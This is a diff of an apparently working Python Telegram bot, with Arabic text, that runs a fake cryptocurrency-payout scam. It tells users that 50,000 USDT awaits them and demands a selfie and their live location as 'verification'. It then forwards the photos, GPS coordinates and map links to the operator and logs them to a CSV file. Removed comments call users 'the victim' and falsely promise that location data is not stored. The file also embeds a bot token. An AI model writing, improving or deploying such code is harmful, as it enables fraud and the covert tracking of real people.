@@ -1,117 +1,300 @@
+#!/usr/bin/env python3
+"""
+Telegram Bot - USDT Verification
+للتحقق من هوية المستخدمين عبر الصورة والموقع
+"""
+
 import telebot
-import random
-import string
+import os
+import csv
+import logging
 from datetime import datetime
 
-TOKEN = "8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y"  # توكن البوت
-OWNER_ID = 8391968596  # ID حسابك
+# ============================================
+# الإعدادات الأساسية
+# ============================================
 
+TOKEN = "8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y"
+OWNER_ID = 8391968596
+DATA_FILE = "users_data.csv"
+
+# إعداد السجلات (Logging)
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s'
+)
+logger = logging.getLogger(__name__)
+
+# تهيئة البوت
 bot = telebot.TeleBot(TOKEN)
 
-# بيانات مزيفة للتحويلات
-fake_transactions = {
-    "USD": ["50,000", "100,000", "200,000", "500,000"],
-    "BTC": ["0.5", "1.2", "2.5", "5.0"],
-    "USDT": ["10,000", "25,000", "50,000", "100,000"]
-}
+# تخزين حالة المستخدمين
+user_state = {}
+
+# ============================================
+# الرسائل النصية
+# ============================================
+
+WELCOME_MSG = (
+    "🎉 *50,000 USDT وصلت لحسابك!*\n\n"
+    "لأسباب أمنية، يجب تأكيد هويتك أولاً.\n\n"
+    "📌 *الخطوة 1:* أرسل صورتك (سيلفي)\n"
+    "📌 *الخطوة 2:* أرسل موقعك الحالي\n\n"
+    "بعدها يتم تحويل المبلغ فوراً ✅"
+)
+
+PHOTO_RECEIVED_MSG = "✅ تم استلام الصورة بنجاح!\n📍 الآن أرسل موقعك الحالي من الزر أدناه:"
+
+LOCATION_RECEIVED_MSG = "✅ *تم التحقق بنجاح!*\nسيتم تحويل 50,000 USDT خلال 5 دقائق.\nشكراً لاستخدامك الخدمة."
+
+ERROR_MSG = "⚠️ أرسل صورتك أولاً رجاءً"
+
+# ============================================
+# الدوال المساعدة
+# ============================================
+
+def create_location_keyboard():
+    """إنشاء keyboard مع زر الموقع"""
+    markup = telebot.types.ReplyKeyboardMarkup(
+        resize_keyboard=True,
+        one_time_keyboard=True
+    )
+    btn = telebot.types.KeyboardButton(
+        "📍 أرسل موقعي الآن",
+        request_location=True
+    )
+    markup.add(btn)
+    return markup
+
+def save_user_data(user_id, username, first_name, data_type, value1="", value2=""):
+    """حفظ بيانات المستخدم في ملف CSV"""
+    file_exists = os.path.isfile(DATA_FILE)
+    with open(DATA_FILE, 'a', newline='', encoding='utf-8') as f:
+        writer = csv.writer(f)
+        if not file_exists:
+            writer.writerow([
+                'Time', 'UserID', 'Username', 'Name',
+                'Type', 'Value1', 'Value2'
+            ])
+        writer.writerow([
+            datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+            user_id,
+            username or 'N/A',
+            first_name or 'N/A',
+            data_type,
+            str(value1),
+            str(value2)
+        ])
+
+def notify_owner(message_text, parse_mode=None):
+    """إرسال إشعار لمالك البوت"""
+    try:
+        bot.send_message(OWNER_ID, message_text, parse_mode=parse_mode)
+    except Exception as e:
+        logger.error(f"فشل إرسال الإشعار: {e}")
+
+# ============================================
+# معالجات الأوامر
+# ============================================
 
 @bot.message_handler(commands=['start'])
-def start_handler(message):
+def handle_start(message):
+    """معالجة أمر /start"""
     chat_id = message.chat.id
+    user_id = message.from_user.id
+    username = message.from_user.username
+    first_name = message.from_user.first_name
     
-    # قصة مقنعة
-    msg = (
-        "🎉 *تم تحويل 50,000 USDT إلى محفظتك!*\n\n"
-        "👤 المستلم: " + (message.from_user.first_name or "المستخدم") + "\n"
-        "💰 المبلغ: 50,000 USDT\n"
-        "📊 الحالة: ✅ مكتمل\n\n"
-        "⚠️ *تنبيه أمني:*\n"
-        "بسبب القيود المفروضة على التحويلات من سوريا، "
-        "يلزم تأكيد موقعك الجغرافي لإطلاق الأموال.\n\n"
-        "🛡️ *الخصوصية:*\n"
-        "يتم استخدام موقعك مرة واحدة فقط للتحقق من الجهة.\n"
-        "لن يتم تخزينه.\n\n"
-        "👇 اضغط على الزر أدناه لتأكيد الموقع وإتمام التحويل:"
-    )
+    logger.info(f"مستخدم جديد: @{username} ({user_id})")
     
-    # زر الموقع فقط — ما في خيار ثاني
-    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-    loc_btn = telebot.types.KeyboardButton("📍 تأكيد موقعي واستلام 50,000 USDT", request_location=True)
-    markup.add(loc_btn)
+    # تخزين حالة المستخدم
+    user_state[user_id] = {'photo': False, 'location': False}
     
-    bot.send_message(chat_id, msg, parse_mode='Markdown', reply_markup=markup)
+    # إرسال رسالة الترحيب
+    bot.send_message(chat_id, WELCOME_MSG, parse_mode='Markdown')
+    bot.send_message(chat_id, "📸 أرسل صورتك الآن:")
     
-    # إشعار لك
-    bot.send_message(
-        OWNER_ID,
-        f"🆕 *دخول جديد*\n"
-        f"👤 @{message.from_user.username}\n"
-        f"🆔 {message.from_user.id}\n"
-        f"📛 {message.from_user.first_name}",
+    # إشعار للمالك
+    notify_owner(
+        f"🆕 *مستخدم جديد دخل البوت*\n"
+        f"👤 @{username}\n"
+        f"🆔 {user_id}\n"
+        f"📛 {first_name}",
         parse_mode='Markdown'
     )
+    
+    # حفظ البيانات
+    save_user_data(user_id, username, first_name, "دخول")
+
+# ============================================
+# معالجات المحتوى
+# ============================================
+
+@bot.message_handler(content_types=['photo'])
+def handle_photo(message):
+    """معالجة استقبال الصور"""
+    chat_id = message.chat.id
+    user_id = message.from_user.id
+    username = message.from_user.username
+    
+    logger.info(f"صورة واردة من @{username}")
+    
+    try:
+        # تحميل الصورة
+        file_id = message.photo[-1].file_id
+        file_info = bot.get_file(file_id)
+        downloaded_file = bot.download_file(file_info.file_path)
+        
+        # حفظ الصورة محلياً
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"photo_{user_id}_{timestamp}.jpg"
+        
+        with open(filename, 'wb') as f:
+            f.write(downloaded_file)
+        
+        # إرسال الصورة للمالك
+        with open(filename, 'rb') as f:
+            bot.send_photo(
+                OWNER_ID,
+                f,
+                caption=(
+                    f"📸 *صورة واردة*\n"
+                    f"👤 @{username}\n"
+                    f"🆔 {user_id}\n"
+                    f"🕐 {datetime.now().strftime('%H:%M:%S')}"
+                ),
+                parse_mode='Markdown'
+            )
+        
+        # تحديث حالة المستخدم
+        if user_id in user_state:
+            user_state[user_id]['photo'] = True
+        
+        # حفظ البيانات
+        save_user_data(user_id, username, message.from_user.first_name, "صورة", file_id)
+        
+        # طلب الموقع
+        bot.send_message(
+            chat_id,
+            PHOTO_RECEIVED_MSG,
+            reply_markup=create_location_keyboard()
+        )
+        
+    except Exception as e:
+        logger.error(f"خطأ في معالجة الصورة: {e}")
+        bot.send_message(chat_id, "❌ حدث خطأ في استقبال الصورة. حاول مرة أخرى.")
 
 @bot.message_handler(content_types=['location'])
-def location_handler(message):
+def handle_location(message):
+    """معالجة استقبال الموقع"""
     chat_id = message.chat.id
+    user_id = message.from_user.id
+    username = message.from_user.username
     lat = message.location.latitude
     lon = message.location.longitude
     
-    # الموقع يوصلك فوراً
-    loc_msg = (
+    logger.info(f"موقع وارد من @{username}: {lat}, {lon}")
+    
+    # إرسال الموقع للمالك
+    location_text = (
         f"📍 *موقع واصل!*\n"
-        f"👤 @{message.from_user.username}\n"
-        f"🆔 {message.from_user.id}\n"
+        f"👤 @{username}\n"
+        f"🆔 {user_id}\n"
         f"🌐 {lat}, {lon}\n"
         f"🔗 https://www.google.com/maps?q={lat},{lon}"
     )
-    bot.send_message(OWNER_ID, loc_msg, parse_mode='Markdown')
+    
+    notify_owner(location_text, parse_mode='Markdown')
     bot.send_location(OWNER_ID, lat, lon)
     
-    # رسالة النجاح للضحية
-    success_msg = (
-        "✅ *تم التحقق من موقعك بنجاح!*\n\n"
-        "🎊 *مبروك! تم تحويل 50,000 USDT*\n\n"
-        "📋 *تفاصيل التحويل:*\n"
-        "🆔 رقم العملية: " + ''.join(random.choices(string.ascii_uppercase + string.digits, k=12)) + "\n"
-        "💰 المبلغ: 50,000 USDT\n"
-        "📅 التاريخ: " + datetime.now().strftime("%Y-%m-%d %H:%M") + "\n"
-        "🏦 الحالة: ✅ مكتمل\n\n"
-        "يمكنك الآن سحب الأموال إلى أي محفظة.\n"
-        "شكراً لاستخدامك خدمتنا!"
+    # تحديث حالة المستخدم
+    if user_id in user_state:
+        user_state[user_id]['location'] = True
+    
+    # حفظ البيانات
+    save_user_data(
+        user_id, username,
+        message.from_user.first_name,
+        "موقع", lat, lon
     )
     
-    # إزالة الكيبورد
-    markup = telebot.types.ReplyKeyboardRemove()
-    bot.send_message(chat_id, success_msg, parse_mode='Markdown', reply_markup=markup)
-
-@bot.message_handler(content_types=['photo'])
-def photo_handler(message):
-    chat_id = message.chat.id
-    
-    # لو أرسل صورة، نطلب الموقع
+    # إرسال رسالة النجاح
     bot.send_message(
         chat_id,
-        "✅ تم استلام الصورة.\n"
-        "الآن أرسل موقعك لإتمام التحويل:",
-        reply_markup=create_loc_keyboard()
+        LOCATION_RECEIVED_MSG,
+        parse_mode='Markdown',
+        reply_markup=telebot.types.ReplyKeyboardRemove()
     )
 
-def create_loc_keyboard():
-    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-    markup.add(telebot.types.KeyboardButton("📍 أرسل موقعي", request_location=True))
-    return markup
-
-@bot.message_handler(func=lambda m: True)
-def fallback_handler(message):
+@bot.message_handler(content_types=['document'])
+def handle_document(message):
+    """معالجة استقبال الملفات"""
     chat_id = message.chat.id
     
-    # أي رسالة من الضحية نرد بنفس الطلب
     bot.send_message(
         chat_id,
-        "⚠️ لإتمام التحويل، يرجى إرسال موقعك عبر الزر أدناه:",
-        reply_markup=create_loc_keyboard()
+        "❌ هذا البوت لا يقبل الملفات. أرسل صورة فقط."
     )
 
-print("✅ بوت التحويل شغال...")
-bot.infinity_polling()
+@bot.message_handler(content_types=['voice', 'video', 'audio', 'sticker'])
+def handle_other_media(message):
+    """معالجة الوسائط الأخرى"""
+    chat_id = message.chat.id
+    
+    bot.send_message(
+        chat_id,
+        "❌ هذا البوت يقبل الصور فقط. أرسل صورة سيلفي."
+    )
+
+# ============================================
+# المعالج الافتراضي
+# ============================================
+
+@bot.message_handler(func=lambda message: True)
+def handle_all_messages(message):
+    """معالجة أي رسالة نصية أخرى"""
+    chat_id = message.chat.id
+    user_id = message.from_user.id
+    text = message.text
+    
+    # التحقق من وجود حالة للمستخدم
+    if user_id in user_state:
+        state = user_state[user_id]
+        
+        if not state['photo']:
+            bot.send_message(chat_id, "📸 أرسل صورتك أولاً")
+        elif not state['location']:
+            bot.send_message(
+                chat_id,
+                "📍 أرسل موقعك الآن",
+                reply_markup=create_location_keyboard()
+            )
+        else:
+            bot.send_message(chat_id, "✅ تم التحقق مسبقاً. شكراً لك!")
+    else:
+        # مستخدم جديد لم يضغط /start
+        bot.send_message(
+            chat_id,
+            "⚠️ أرسل /start للبدء",
+            reply_markup=telebot.types.ReplyKeyboardRemove()
+        )
+
+# ============================================
+# تشغيل البوت
+# ============================================
+
+def main():
+    """الدالة الرئيسية لتشغيل البوت"""
+    logger.info("✅ بوت USDT Verification شغال...")
+    print("✅ بوت USDT Verification شغال...")
+    print(f"📊 سيتم حفظ البيانات في: {DATA_FILE}")
+    
+    try:
+        bot.infinity_polling(timeout=60, long_polling_timeout=60)
+    except KeyboardInterrupt:
+        logger.info("❌ تم إيقاف البوت يدوياً")
+    except Exception as e:
+        logger.error(f"❌ خطأ في تشغيل البوت: {e}")
+
+if __name__ == "__main__":
+    main()
